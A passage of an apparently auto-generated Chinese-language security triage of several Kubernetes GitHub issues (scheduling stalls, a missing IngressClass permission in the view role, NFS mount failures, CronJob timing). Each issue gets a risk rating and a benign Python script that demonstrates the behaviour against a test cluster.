        check_timeout()
        try:
            pods = core_v1_api.list_namespaced_pod(
                namespace=NAMESPACE,
                label_selector=POD_LABEL_SELECTOR
            )
            for pod in pods.items:
                if pod.metadata.creation_timestamp > eviction_timestamp_utc:
                    # Found a pod created *after* the eviction timestamp
                    print(f"Found new pod: {pod.metadata.name} created at {pod.metadata.creation_timestamp.isoformat()}")
                    return pod.metadata.name, pod.metadata.creation_timestamp # Return name and creation time

            print(f"No new pod found yet. Retrying... (Elapsed: {time.time() - start_wait:.1f}s)")
            time.sleep(5)

        except ApiException as e:
            print(f"Error listing pods: {e}. Retrying...", file=sys.stderr)
            time.sleep(5)
        except Exception as e:
            print(f"An unexpected error occurred waiting for new pod: {e}. Aborting wait.", file=sys.stderr)
            return None # Indicate failure


# --- Timeout Handling & Execution ---
end_time = 0 # Initialize globally

# Execute the main function
run_poc()
```


**解释说明：**

该 Python 脚本使用 `kubernetes` 客户端库来模拟和观察 Issue 中描述的行为。

1.  **环境假设**: 脚本假设用户已配置好 `kubectl` 环境，并且 Python 环境中安装了 `kubernetes` 库 (`pip install kubernetes`)。它会尝试从默认位置 (`~/.kube/config` 或 KUBECONFIG 环境变量) 加载 Kubernetes 配置。
2.  **Job 定义**: 脚本内定义了一个与 Issue 中类似的 Kubernetes Job YAML 字符串，包含 `podFailurePolicy`，设置了对 `DisruptionTarget` 条件执行 `Ignore` 操作。
3.  **创建 Job**: 使用 `BatchV1Api` 在目标集群的 `default` 命名空间中创建这个 Job。
4.  **等待 Pod 运行**: 使用 `CoreV1Api` 轮询查找属于该 Job 且状态为 `Running` 的 Pod。设置了超时机制。
5.  **驱逐 Pod**: 一旦找到运行中的 Pod，脚本使用 `CoreV1Api` 的 `create_namespaced_pod_eviction` 方法发送驱逐请求，模拟 `kubectl drain` 或类似操作导致 Pod 被标记为中断目标的情况。记录驱逐请求发送的时间点。
6.  **监控新 Pod 创建**: 脚本接着轮询 Pod 列表，查找一个属于该 Job 且创建时间戳晚于驱逐请求时间戳的新 Pod。
7.  **计算延迟**: 如果找到新的 Pod，脚本会计算从发送驱逐请求到新 Pod 被创建之间的时间差。
8.  **结果分析**: 脚本会打印观察到的延迟。根据 Issue 的描述，预期这个延迟会大于等于 Kubernetes 默认的初始 Job Pod 退避延迟（通常是 10 秒），即使 `podFailurePolicy` 设置了 `Ignore`。脚本会根据观察到的延迟时间打印一个结论，说明观察结果是否与 Issue 描述的行为一致。
9.  **资源清理**: 使用 `finally` 块确保无论脚本执行成功与否，都会尝试删除创建的 Job 及其关联的 Pod。
10. **超时控制**: 脚本包含一个全局超时 (`MAX_WAIT_SECONDS`)，防止无限期运行，并在等待循环中检查是否超时。

**重要提示**: 此脚本旨在本地或测试环境中**演示** Issue 中描述的 Kubernetes 行为，确认 `Ignore` action 对 `DisruptionTarget` 是否会触发 Backoff Delay。它本身**不是**一个利用安全漏洞的脚本，因为所描述的问题并非安全漏洞。运行此脚本需要对目标 Kubernetes 集群具有创建 Job、列出/驱逐 Pod 的权限。

---


## Issue #130855 Scheduling problem after upgrade: Pods are created, Containers pending indefinitely

- Issue 链接：[#130855](https://github.com/kubernetes/kubernetes/issues/130855)

### Issue 内容

I have made a simple patch upgrade from 1.31.4 to 1.31.7, as well as patch upgrades to Containerd, Cuda and drivers & container toolkit.

The cluster is comprised of seven nodes: 1 control plane, 2 storage servers and 4 workers with A100 GPUs.

Now all of a sudden, I have a very strange situation when scheduling nodes on the workers (only on them, others work fine). If a pod is scheduled, it will start normally on one node, but on all others it will merely be created, but never gets any containers, no events, nothing for hours.

Now I noticed that while the pod is pending, I just need to restart the kubelet on the node it is pending on and its containers will be created and it will start up fine.

I am completely stumped as to how to debug this properly, as I cannot find any clues in the logs. Containerd never seems to notice about the pod's containers, so there is no message there and I can't find the reason in the scheduler log.

This is what the scheduler produces when it does not create the containers:

```
I0316 17:27:20.579516       1 eventhandlers.go:149] "Add event for unscheduled pod" pod="jupyterhub/static-web"
I0316 17:27:20.579594       1 schedule_one.go:83] "About to try and schedule pod" pod="jupyterhub/static-web"
I0316 17:27:20.579607       1 schedule_one.go:96] "Attempting to schedule pod" pod="jupyterhub/static-web"
I0316 17:27:20.580265       1 default_binder.go:53] "Attempting to bind pod to node" logger="Bind.DefaultBinder" pod="jupyterhub/static-web" node="work-e"
I0316 17:27:20.583527       1 schedule_one.go:314] "Successfully bound pod to node" pod="jupyterhub/static-web" node="work-e" evaluatedNodes=6 feasibleNodes=1
I0316 17:27:20.583561       1 eventhandlers.go:231] "Add event for scheduled pod" pod="jupyterhub/static-web"
I0316 17:27:20.583546       1 eventhandlers.go:201] "Delete event for unscheduled pod" pod="jupyterhub/static-web"
```

After a restart, it continues:
```
I0316 17:28:26.776334       1 eventhandlers.go:99] "Update event for node" node="work-e"
I0316 17:28:28.117177       1 eventhandlers.go:268] "Update event for scheduled pod" pod="jupyterhub/static-web"
I0316 17:28:29.991015       1 reflector.go:871] k8s.io/client-go/informers/factory.go:160: Watch close - *v1.ReplicationController total 6 items received
I0316 17:28:30.341939       1 eventhandlers.go:268] "Update event for scheduled pod" pod="jupyterhub/static-web"
```

Does anyone have an idea where to look for why the containers are never started?

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了一个在 Kubernetes 集群升级（Kubernetes 版本、Containerd、Cuda 驱动等）后出现的调度问题。具体表现为：在某些工作节点上（带有 A100 GPU），通过调度器成功调度并绑定到节点的 Pod 可以被创建，但其容器长时间处于 Pending 状态，无法正常启动。重启该节点上的 `kubelet` 服务后，对应的 Pod 容器才能被创建并启动。

1.  **问题性质**：这看起来是一个功能性 Bug 或兼容性问题，而不是一个典型的安全漏洞。问题核心在于 `kubelet` 在 Pod 被调度到节点后，未能正确地与容器运行时（Containerd）交互以启动容器，直到 `kubelet` 重启。
2.  **潜在影响**：主要影响是**可用性 (Availability)**。被调度到受影响节点上的 Pod 无法运行，导致依赖这些 Pod 的服务中断或延迟。这可以被视为一种拒绝服务（Denial of Service, DoS）状态，但它是由系统内部的故障引起的，而非外部攻击直接触发的漏洞利用。
3.  **攻击者利用可能**：一个拥有在集群中创建 Pod 权限（例如，`create pods`）的用户，如果知道哪些节点受此问题影响，可以故意将 Pod 调度到这些节点上，从而导致这些 Pod 无法启动。这会消耗节点资源（至少是 Pod 对象本身占用的资源）并阻止其他合法工作负载在这些节点上运行。
4.  **风险判断依据（结合标准）**：
    *   标准 2：问题本质上是一个功能性 Bug 或配置/兼容性问题，而非安全漏洞设计。
    *   标准 5：虽然可能导致 DoS，但触发条件（创建 Pod）需要攻击者具备非只读权限（`create pods`）。这种因系统故障导致的、需要一定权限才能触发的可用性问题，通常不被评为高风险。重启 `kubelet` (workaround) 需要更高的节点或集群管理员权限。
    *   标准 7 & 8：问题描述中没有迹象表明此问题可导致命令执行、容器逃逸、提权或跨用户/租户的直接攻击。影响主要局限于 Pod 无法启动，影响的是调度到该故障节点上的工作负载的可用性。
    *   标准 9：信息足够判断其主要影响是可用性问题，而非高危安全风险。

**结论**：该 Issue 描述的是一个由升级引起的功能性问题，导致 Pod 无法正常启动，影响了服务的可用性。虽然具有 DoS 的效果，但它源于系统内部故障，且利用（如果可以称为利用的话）需要 Pod 创建权限，并未直接导致数据泄露、权限提升或远程代码执行等高风险后果。因此，根据提供的风险判断标准，此问题不属于需要高风险评级的安全漏洞。

**复现过程：**

```python
# 该 Issue 描述的是一个功能性 Bug，而非安全漏洞，因此风险评级为“不涉及”。
# 根据要求，仅针对高风险问题提供复现脚本。
# 此处无需提供复现脚本。

print("该 Issue 被判定为功能性问题，风险评级为 '不涉及'，无需提供复现脚本。")

# 模拟主执行逻辑（根据要求，不使用 if __name__ == "__main__":）
def main():
    print("执行完成。")

main()
```


**解释说明：**

该 Python 脚本并未尝试复现 Issue 中描述的问题。因为经过分析，该 Issue 被定性为 Kubernetes 集群升级后出现的功能性故障或兼容性问题，主要影响是 Pod 的可用性，而非一个可被利用的安全漏洞。根据用户提供的风险判断标准，此问题风险评级为“不涉及”。

要求中明确指出，“针对高风险问题，必须给出使用 python 编写的复现脚本”。由于此问题不属于高风险，因此不需要提供复现脚本。脚本内容仅包含一条打印语句，说明了不提供复现脚本的原因，并包含一个简单的 `main` 函数以符合执行结构的要求（尽管在此场景下意义不大）。

---


## Issue #130841 “view” ClusterRole is missing IngressClass.

- Issue 链接：[#130841](https://github.com/kubernetes/kubernetes/issues/130841)

### Issue 内容

#### summary

“view” ClusterRole is missing IngressClass.

https://github.com/kubernetes/kubernetes/blob/157f42bff333811956531ea692cc1fdfa0d6a0a4/plugin/pkg/auth/authorizer/rbac/bootstrappolicy/policy.go#L140

but, `IngressClass` is a kind of `networkingk8s.io`

https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.32/#ingressclass-v1-networking-k8s-io

#### what to do?

Make additions similar to EndpointSlice.

https://github.com/kubernetes/kubernetes/commit/896bb932effab720f15cd5f55bee54567fd3f208#diff-20a4cb385b45847644dd1d7f54ffd9427168b75ba2040ad1821c70955ca7f017

#### situation

when I create this ClusterRoleBinding

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: kubernetes-dashboard-web
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: view
subjects:
- kind: ServiceAccount
  name: kubernetes-dashboard-web
  namespace: kube-system
```

then, it errors.
This prevents the use of minimum privileges in the k8s-dashboard.

<img width="298" alt="Image" src="https://github.com/user-attachments/assets/20dd713d-384f-4d18-a702-306a024ff699" />

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 指出 Kubernetes 内建的 `view` ClusterRole 缺少对 `networking.k8s.io/v1` API 组下 `IngressClass` 资源的读取权限（`get`, `list`, `watch`）。

1.  **问题性质**：`view` ClusterRole 的设计目的是提供对集群内大多数资源的只读访问权限。随着 Kubernetes 的发展，新的资源类型（如 `IngressClass`）被引入。如果内建角色没有及时更新以包含这些新资源的只读权限，那么被赋予该角色的用户或服务账号在尝试访问这些新资源时就会遇到权限错误。
2.  **具体场景**：Issue 提交者提供了一个例子，将一个 ServiceAccount (`kubernetes-dashboard-web`) 通过 ClusterRoleBinding 绑定到了 `view` ClusterRole。当这个 ServiceAccount（可能是 Kubernetes Dashboard 使用的）尝试列出或获取 `IngressClass` 资源时，由于 `view` 角色缺少相应权限，操作失败并报错（截图显示了相关错误）。提交者认为这阻碍了为 Kubernetes Dashboard 配置最小权限原则。
3.  **安全风险评估**：
    *   该问题本质上是**权限缺失**，而不是权限过大或权限绕过。`view` 角色未能按预期提供对某类资源的只读访问。
    *   这不会导致未经授权的写操作、权限提升、命令执行、信息泄露（除了无法读取 `IngressClass` 信息本身）或拒绝服务（DoS）。
    *   攻击者无法利用这个“缺失”的权限来攻击系统或获取非法访问权限。
    *   虽然这会导致依赖 `view` 角色的应用（如 Dashboard）功能受限，迫使用户可能需要授予更广泛的权限（例如 `cluster-admin` 或自定义一个包含 `IngressClass` 读取权限的角色）来解决功能问题，但这属于配置和功能完整性问题，而非安全漏洞。用户需要自行管理和调整RBAC策略以满足应用需求。
    *   根据提供的风险判断标准：
        *   标准2：该问题非安全问题，因为它描述的是功能缺失（权限不足），而非可利用的漏洞。
        *   标准4：Issue 提交者暴露的配置信息 (`ClusterRoleBinding`) 是标准的 Kubernetes 对象定义，不包含敏感信息。即使包含，也属于提交者的问题，不计入项目风险。
        *   标准5、6、7、8：均不适用，因为问题不涉及 DoS、凭据泄露、命令执行或多用户影响。

结论：该 Issue 描述的是一个 Kubernetes 内建 RBAC 角色定义不完整导致的功能性问题，而非安全漏洞。

**复现过程：**

```python
import logging
import time
import sys
from kubernetes import config, client
from kubernetes.client.rest import ApiException
import contextlib
import os

# 配置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 定义资源名称
NAMESPACE = "issue-demonstration-ns"
SERVICE_ACCOUNT_NAME = "view-test-sa"
# 注意：ClusterRoleBinding 是集群级别的，没有 namespace
CLUSTER_ROLE_BINDING_NAME = "view-test-sa-binding"
# 使用 view ClusterRole，这是内建的
CLUSTER_ROLE_NAME = "view"

def demonstrate_missing_permission():
    """
    尝试复现 'view' ClusterRole 缺少 IngressClass 读取权限的问题。
    """
    try:
        # 1. 加载 KubeConfig，假设在默认位置 ~/.kube/config
        logging.info("加载 Kubernetes 配置...")
        try:
            config.load_kube_config()
        except Exception as e:
            logging.error(f"无法加载 kubeconfig: {e}")
            logging.error("请确保 kubeconfig 文件存在于默认位置或已配置 KUBECONFIG 环境变量。")
            sys.exit(1)

        # 2. 创建 API 客户端
        core_v1_api = client.CoreV1Api()
        rbac_v1_api = client.RbacAuthorizationV1Api()
        networking_v1_api = client.NetworkingV1Api()
        api_client = client.ApiClient() # 用于模拟 ServiceAccount

        logging.info(f"测试环境准备...")

        # 3. 创建 Namespace
        namespace_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=NAMESPACE))
        try:
            logging.info(f"创建 Namespace: {NAMESPACE}")
            core_v1_api.create_namespace(body=namespace_body)
            time.sleep(2) # 等待 namespace 创建完成
        except ApiException as e:
            if e.status == 409: # Conflict, already exists
                logging.warning(f"Namespace {NAMESPACE} 已存在，继续...")
            else:
                logging.error(f"创建 Namespace {NAMESPACE} 失败: {e}")
                raise

        # 4. 创建 Service Account
        sa_body = client.V1ServiceAccount(
            metadata=client.V1ObjectMeta(name=SERVICE_ACCOUNT_NAME, namespace=NAMESPACE)
        )
        try:
            logging.info(f"在 Namespace {NAMESPACE} 中创建 ServiceAccount: {SERVICE_ACCOUNT_NAME}")
            core_v1_api.create_namespaced_service_account(namespace=NAMESPACE, body=sa_body)
            time.sleep(2) # 等待 SA 创建
        except ApiException as e:
            if e.status == 409:
                logging.warning(f"ServiceAccount {SERVICE_ACCOUNT_NAME} 在 {NAMESPACE} 中已存在，继续...")
            else:
                logging.error(f"创建 ServiceAccount {SERVICE_ACCOUNT_NAME} 失败: {e}")
                raise

        # 5. 创建 ClusterRoleBinding 将 Service Account 绑定到 'view' ClusterRole
        # 注意 ClusterRoleBinding 是集群级别的
        crb_body = client.V1ClusterRoleBinding(
            metadata=client.V1ObjectMeta(name=CLUSTER_ROLE_BINDING_NAME),
            role_ref=client.V1RoleRef(
                api_group="rbac.authorization.k8s.io",
                kind="ClusterRole",
                name=CLUSTER_ROLE_NAME
            ),
            subjects=[client.V1Subject(
                kind="ServiceAccount",
                name=SERVICE_ACCOUNT_NAME,
                namespace=NAMESPACE
            )]
        )
        try:
            logging.info(f"创建 ClusterRoleBinding: {CLUSTER_ROLE_BINDING_NAME} 将 SA {NAMESPACE}/{SERVICE_ACCOUNT_NAME} 绑定到 ClusterRole '{CLUSTER_ROLE_NAME}'")
            rbac_v1_api.create_cluster_role_binding(body=crb_body)
            time.sleep(2) # 等待 RBAC 规则生效
        except ApiException as e:
            if e.status == 409:
                logging.warning(f"ClusterRoleBinding {CLUSTER_ROLE_BINDING_NAME} 已存在，继续...")
                # 如果已存在，可能需要更新或确认其配置正确
                # 为了演示，我们假设如果已存在，它就是我们想要的配置
                pass
            else:
                logging.error(f"创建 ClusterRoleBinding {CLUSTER_ROLE_BINDING_NAME} 失败: {e}")
                raise

        logging.info("环境准备完毕。开始测试权限...")

        # 6. 尝试使用 Service Account 的身份列出 IngressClass (集群范围资源)
        # Kubernetes Python 客户端使用 impersonation 需要设置 ApiClient 的参数
        # Service Account 的用户名为: system:serviceaccount:<namespace>:<serviceaccountname>
        sa_user = f"system:serviceaccount:{NAMESPACE}:{SERVICE_ACCOUNT_NAME}"
        logging.info(f"尝试以 ServiceAccount '{sa_user}' 的身份列出 IngressClass...")

        # 创建一个新的 ApiClient 实例用于模拟
        impersonated_api_client = client.ApiClient()
        impersonated_api_client.configuration.host = api_client.configuration.host # 继承当前 host
        impersonated_api_client.configuration.ssl_ca_cert = api_client.configuration.ssl_ca_cert
        impersonated_api_client.configuration.cert_file = api_client.configuration.cert_file
        impersonated_api_client.configuration.key_file = api_client.configuration.key_file
        impersonated_api_client.configuration.api_key = api_client.configuration.api_key # 继承认证信息

        # 设置 impersonation header
        impersonated_api_client.set_default_header("Impersonate-User", sa_user)
        # ServiceAccount 默认属于 system:serviceaccounts 和 system:serviceaccounts:<namespace> 组
        impersonated_api_client.set_default_header("Impersonate-Group", f"system:serviceaccounts:{NAMESPACE}")
        impersonated_api_client.set_default_header("Impersonate-Group", "system:serviceaccounts") # 包含两个组

        impersonated_networking_v1_api = client.NetworkingV1Api(impersonated_api_client)

        try:
            impersonated_networking_v1_api.list_ingress_class(timeout_seconds=10)
            # 如果执行到这里，说明权限检查通过了，与预期不符
            logging.error(f"预期外的成功：ServiceAccount '{sa_user}' 似乎拥有列出 IngressClass 的权限。")
            logging.error("这可能意味着集群中的 'view' ClusterRole 已被修改，或者存在其他授权规则。")
            result = False
        except ApiException as e:
            if e.status == 403:
                # 这是预期的结果，因为 'view' 角色默认不包含 IngressClass 的 list 权限
                logging.info(f"成功复现：收到预期的 403 Forbidden 错误。")
                logging.info(f"错误详情: {e.reason} - {e.body}")
                result = True
            else:
                # 其他非 403 的 API 错误
                logging.error(f"尝试列出 IngressClass 时发生非预期的 API 错误: {e}")
                result = False
        except Exception as e:
             logging.error(f"尝试列出 IngressClass 时发生未知错误: {e}")
             result = False

        if result:
            logging.info("结论：成功验证 'view' ClusterRole 默认缺少列出 IngressClass 的权限。")
        else:
            logging.warning("结论：未能按预期验证权限缺失。请检查集群配置或脚本逻辑。")

    except Exception as e:
        logging.error(f"脚本执行过程中发生错误: {e}", exc_info=True)
    finally:
        # 7. 清理资源
        logging.info("开始清理测试资源...")
        try:
            # 删除 ClusterRoleBinding
            with contextlib.suppress(ApiException): # 忽略 'Not Found' 等错误
                logging.info(f"删除 ClusterRoleBinding: {CLUSTER_ROLE_BINDING_NAME}")
                rbac_v1_api.delete_cluster_role_binding(name=CLUSTER_ROLE_BINDING_NAME, body=client.V1DeleteOptions(propagation_policy='Foreground', grace_period_seconds=0))
                time.sleep(2) # 等待删除

            # 删除 Service Account (需要先加载一次 API 客户端，以防之前失败)
            with contextlib.suppress(ApiException):
                logging.info(f"删除 ServiceAccount: {SERVICE_ACCOUNT_NAME} in {NAMESPACE}")
                core_v1_api.delete_namespaced_service_account(name=SERVICE_ACCOUNT_NAME, namespace=NAMESPACE, body=client.V1DeleteOptions(propagation_policy='Foreground', grace_period_seconds=0))
                time.sleep(2) # 等待删除

            # 删除 Namespace
            with contextlib.suppress(ApiException):
                logging.info(f"删除 Namespace: {NAMESPACE}")
                core_v1_api.delete_namespace(name=NAMESPACE, body=client.V1DeleteOptions(propagation_policy='Foreground', grace_period_seconds=0))
                logging.info("等待 Namespace 删除完成...")
                # 等待 namespace 彻底删除，可以简单 sleep 或轮询检查
                time.sleep(10)

        except NameError:
             logging.warning("API 客户端未成功初始化，跳过部分清理步骤。")
        except Exception as e:
            logging.error(f"清理资源时发生错误: {e}", exc_info=True)
            logging.warning("请手动清理资源：Namespace '{NAMESPACE}', ClusterRoleBinding '{CLUSTER_ROLE_BINDING_NAME}'")

        logging.info("清理完成。")

# 直接执行主函数
demonstrate_missing_permission()
```


**解释说明：**

该 Python 脚本旨在使用 Kubernetes Python 客户端库来**验证** Issue 中描述的问题，即验证绑定到内建 `view` ClusterRole 的 ServiceAccount 是否确实没有权限列出 `IngressClass` 资源。这**不是一个利用漏洞的 POC**，而是对 Issue 所报告现象的编程方式确认。

脚本执行流程如下：
1.  **加载配置**：从默认位置 (`~/.kube/config` 或环境变量 `KUBECONFIG`) 加载 Kubernetes 集群的连接配置。
2.  **创建 K8s 客户端**：初始化与 Kubernetes API Server交互所需的客户端对象 (`CoreV1Api`, `RbacAuthorizationV1Api`, `NetworkingV1Api`)。
3.  **环境准备**：
    *   创建 一个临时的 Namespace (`issue-demonstration-ns`) 用于隔离测试资源。
    *   在 该 Namespace 中创建一个 ServiceAccount (`view-test-sa`)。
    *   创建 一个 ClusterRoleBinding (`view-test-sa-binding`)，将这个 ServiceAccount 绑定到集群范围的内建 `view` ClusterRole。
4.  **权限测试**：
    *   配置一个新的 `ApiClient` 实例，设置 HTTP Header 来**模拟 (Impersonate)** 刚创建的 ServiceAccount (`system:serviceaccount:issue-demonstration-ns:view-test-sa`) 的身份。
    *   使用这个模拟身份的 `NetworkingV1Api` 客户端尝试执行 `list_ingress_class()` 操作。
    *   **预期结果**：由于 `view` ClusterRole 默认不包含 `networking.k8s.io` API 组下 `ingressclasses` 资源的 `list` 权限，此 API 调用应该失败，并返回 HTTP 403 Forbidden 错误。
    *   脚本会捕获 `ApiException`，检查错误状态码是否为 403。如果是 403，则认为成功复现了 Issue 中描述的权限缺失问题；否则记录意外的成功或失败。
5.  **资源清理**：使用 `try...finally` 块确保无论测试是否成功或出错，脚本都会尝试删除之前创建的所有资源（ClusterRoleBinding、ServiceAccount、Namespace），以保持集群环境的清洁。使用 `contextlib.suppress(ApiException)` 来优雅地处理删除时资源可能已被删除的情况。

该脚本通过编程方式模拟了 Issue 中用户手动操作的场景，并验证了权限检查的结果，从而确认了 `view` ClusterRole 在标准 Kubernetes 发行版中确实缺少对 `IngressClass` 的读取权限。

---


## Issue #130839 NFS mount failed after GKE upgrade me to 1.32 from 1.31

- Issue 链接：[#130839](https://github.com/kubernetes/kubernetes/issues/130839)

### Issue 内容

#### What happened?

I was using https://artifacthub.io/packages/helm/kvaps/nfs-server-provisioner and relied on the 'nfs' storageClass it creates and it has worked great.

But after the upgrade to 1.32 where also (if relevant, google upgraded base image version of ubuntu: Starting with GKE version 1.32.1-gke.1002000, the default OS image for Ubuntu is updated from Ubuntu 22.04 to Ubuntu 24.04.


Error I got after upgrade

```
│ Events:                                                                                                                                                                                                                                                         │
│   Type     Reason             Age                From                Message                                                                                                                                                                                    │
│   ----     ------             ----               ----                -------                                                                                                                                                                                    │
│   Warning  FailedScheduling   13s (x2 over 14s)  default-scheduler   0/6 nodes are available: pod has unbound immediate PersistentVolumeClaims. preemption: 0/6 nodes are available: 6 Preemption is not helpful for scheduling.                                │
│   Normal   NotTriggerScaleUp  13s                cluster-autoscaler  pod didn't trigger scale-up: 2 pod has unbound immediate PersistentVolumeClaims                                                                                                            │
│   Normal   Scheduled          10s                default-scheduler   Successfully assigned default/generate-queue-worker-default-deployment-74cf9b9c48-csgzn to gke-motoaction-cluster-01-pool-1-50bf8ed5-jxod                                                  │
│   Warning  FailedMount        2s (x5 over 10s)   kubelet             MountVolume.SetUp failed for volume "pvc-f5ed14c5-5005-4214-a47c-55f3e484e019" : mount failed: exit status 1                                                                               │
│ Mounting command: /home/kubernetes/containerized_mounter/mounter                                                                                                                                                                                                │
│ Mounting arguments: mount -t nfs -o nolock,vers=3 10.172.14.147:/export/pvc-f5ed14c5-5005-4214-a47c-55f3e484e019 /var/lib/kubelet/pods/9696f022-f447-4127-ab24-677d99af0561/volumes/kubernetes.io~nfs/pvc-f5ed14c5-5005-4214-a47c-55f3e484e019                  │
│ Output: Mount failed: mount failed: exit status 127                                                                                                                                                                                                             │
│ Mounting command: chroot                                                                                                                                                                                                                                        │
│ Mounting arguments: [/home/kubernetes/containerized_mounter/rootfs mount -t nfs -o nolock,vers=3 10.172.14.147:/export/pvc-f5ed14c5-5005-4214-a47c-55f3e484e019 /var/lib/kubelet/pods/9696f022-f447-4127-ab24-677d99af0561/volumes/kubernetes.io~nfs/pvc-f5ed14 │
│ c5-5005-4214-a47c-55f3e484e019]                                                                                                                                                                                                                                 │
│ Output: chroot: failed to run command ‘mount’: No such file or directory                                                                                                                                                                                        │
│
```


I guess it means it does not find the mount command where it exists it to live ?

I am no expert in k8s, but just checking inside the running node the mount command exists here:

/host/home/kubernetes/containerized_mounter/rootfs/bin/mount

and

/usr/bin/mount


-------

As I had to get the system up and running I abondoned that helm chart and installed a external nfs server and moved to nfs-csi plugin and now it works again. 

Maybe this is all deprecated I don't know, but in case it's a real problem someone might want to look into it.




#### What did you expect to happen?

The nfs mounts to work as before in 1.31 and earlier.

#### How can we reproduce it (as minimally and precisely as possible)?

Install https://artifacthub.io/packages/helm/kvaps/nfs-server-provisioner and try to create a PVC and add mount it to pod.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.32.2-gke.1182000
```

</details>


#### Cloud provider

<details>
GKE (Google)
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
Issue描述了一个在GKE环境从1.31版本升级到1.32版本（同时底层操作系统从Ubuntu 22.04升级到24.04）后，使用`kvaps/nfs-server-provisioner`创建的NFS类型PersistentVolumeClaim（PVC）无法被Pod挂载的问题。

关键错误信息是`MountVolume.SetUp failed ... mount failed: exit status 127`以及更具体的`chroot: failed to run command ‘mount’: No such file or directory`。这表明`kubelet`在尝试执行挂载操作时，在其用于挂载的容器化环境（`containerized_mounter`）的`chroot`内部找不到`mount`命令。用户确认了在节点上（host路径下）`mount`命令是存在的。

这个问题本质上是一个兼容性或配置问题，很可能是由于GKE或底层操作系统升级后，`kubelet`的容器化挂载程序的路径、依赖或工作方式发生了变化，导致旧的`nfs-server-provisioner`（或者说其依赖的NFS客户端挂载方式）与新环境不兼容。用户通过切换到`nfs-csi`插件解决了问题，这也侧面印证了问题在于旧的in-tree或非CSI驱动与新环境的兼容性。

根据风险判断标准：
1.  该问题是一个功能性故障（NFS无法挂载），不是一个安全漏洞。它没有描述数据泄露、未授权访问、权限提升、命令执行等安全风险。
2.  错误日志中没有暴露敏感信息（如凭证）。显示的IP地址（10.172.14.147）是内部NFS服务器地址，挂载路径是标准的Kubernetes PVC路径，这些信息在集群内部通常是可知的，不构成敏感信息泄露。
3.  问题是由环境升级（GKE和OS版本）触发的兼容性问题，并非由攻击者恶意利用导致。
4.  用户最终通过更换存储插件解决了问题，说明这不是一个普遍存在的、难以规避的安全缺陷。

因此，该Issue描述的是一个功能兼容性问题，不涉及安全风险。

**复现过程：**

```python
# 无需生成复现脚本，因为该Issue被评定为“不涉及”安全风险。
# Issue描述的是一个环境升级导致的兼容性问题，而非可被利用的安全漏洞。
print("该Issue被评定为'不涉及'安全风险，无需生成复现脚本。")
print("问题是由于GKE版本和底层OS升级导致nfs-server-provisioner挂载失败，属于兼容性问题。")
```


**解释说明：**

该Issue报告了一个在特定环境（GKE 1.32，Ubuntu 24.04）下使用特定Helm Chart（`kvaps/nfs-server-provisioner`）时出现的NFS挂载失败问题。根本原因是环境升级后，kubelet执行挂载操作的内部机制（containerized mounter）无法找到或执行`mount`命令。这属于软件兼容性和配置问题，而非安全漏洞。没有证据表明此问题可被攻击者利用来执行未授权操作、获取敏感信息或提升权限。因此，风险评级为“不涉及”，不需要提供用于复现安全漏洞的POC脚本。提供的Python代码仅用于说明此结论。

---


## Issue #130838 Cronjob may run at unexpected time in certain conditions

- Issue 链接：[#130838](https://github.com/kubernetes/kubernetes/issues/130838)

### Issue 内容

#### What happened?

We had a job scheduled to run every day at 11pm.
We updated it to run every day at 5am and we applied the change between 5am and 11pm.
The job unexpectedly run at 11pm the same day and now run every day at 5am as expected.

#### What did you expect to happen?

The job should have run the next day a 5am.

#### How can we reproduce it (as minimally and precisely as possible)?

- Create a cronjob and schedule it to run at a past date
- Patch its status as if it already ran in the past
- Patch it to run in the next minute
- Patch it to run in the next two minutes

Wait a minute and see that a job has unexpectedly run.
Wait another minute to see that the job runs at the expected time.

Example:
```bash
# Create a cronjob scheduled to in the past
kubectl apply -f- <<EOF
apiVersion: batch/v1
kind: CronJob
metadata:
  name: hello
spec:
  schedule: "$(date -u -d "1 day ago" +"%M %H %d %m *")"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: hello
            image: busybox:1.28
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c
            - date; echo Hello from the Kubernetes cluster
          restartPolicy: OnFailure
EOF

# Patch its status as if it already ran in the past
yersterday=$(date -u -d "1 day ago" +"%Y-%m-%dT%H:%M:00Z")
kubectl patch cronjob hello --subresource=status -p '{"status":{"lastScheduleTime":"'"${yersterday}"'","lastSuccessfulTime":"'"${yersterday}"'"}}'
echo -e "$(kubectl get cronjob hello -o jsonpath='schedule: {.spec.schedule}\nlastScheduleTime: {.status.lastScheduleTime}')"

# Patch it to run in one minute
kubectl patch cronjob hello -p '{"spec":{"schedule":"'"$(date -u -d "1 minute" +"%M %H * * *")"'"}}'
echo "New schedule: $(kubectl get cronjob hello -o jsonpath='{.spec.schedule}')"

# Patch it to run in two minute
kubectl patch cronjob hello -p '{"spec":{"schedule":"'"$(date -u -d "2 minute" +"%M %H * * *")"'"}}'
echo "New schedule: $(kubectl get cronjob hello -o jsonpath='{.spec.schedule}')"

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了 Kubernetes CronJob 在特定条件下（更新 schedule 时间，并且在旧 schedule 时间点之前、新 schedule 时间点之后应用更新）可能会在预期之外的时间点（旧的 schedule 时间点）执行一次的问题。

